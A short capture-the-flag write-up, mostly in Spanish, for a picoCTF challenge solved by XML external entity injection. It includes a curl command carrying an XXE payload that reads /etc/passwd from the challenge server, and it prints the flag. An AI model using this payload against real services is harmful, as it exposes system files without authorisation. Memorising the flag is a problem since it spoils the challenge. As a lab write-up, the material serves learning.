# 2 - SOAP

## Descripcion:
* The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Additional details will be available after launching your challenge instance.
* XML external entity Injection

## Solucion:
* http://saturn.picoctf.net:64497/
* <strong>Special Info::::</strong> Created By security and privacy experts
* <strong>Special Info::::</strong>
University in Kigali, Rwanda offereing MSECE, MSIT and MS EA
* curl -X POST http://saturn.picoctf.net:64497/ \
* curl -X POST http://saturn.picoctf.net:64497/data -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?* ><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data><ID>&xxe;</ID></data>"
* picoCTF{XML_3xtern@l_3nt1t1ty_0e13660d}

## Notas:
* vemos la pagina web
* entramos a network en la inspeccion de codigo y vemos que pasa alli al seleccionar los 3 parametrso
* como no pasa nada pero nos da la informacion de que podemos usar curl -x lo hacemos
* vemos que si nos dice la informacion que alli se esta almacenando intentamos con get pero tampoco no dice nada
* asi que extraemos toda la informacion de la coneccion de la aplicacion ya que verificamos que no necesitamos permisos
* nos da la bandera

## Referencias: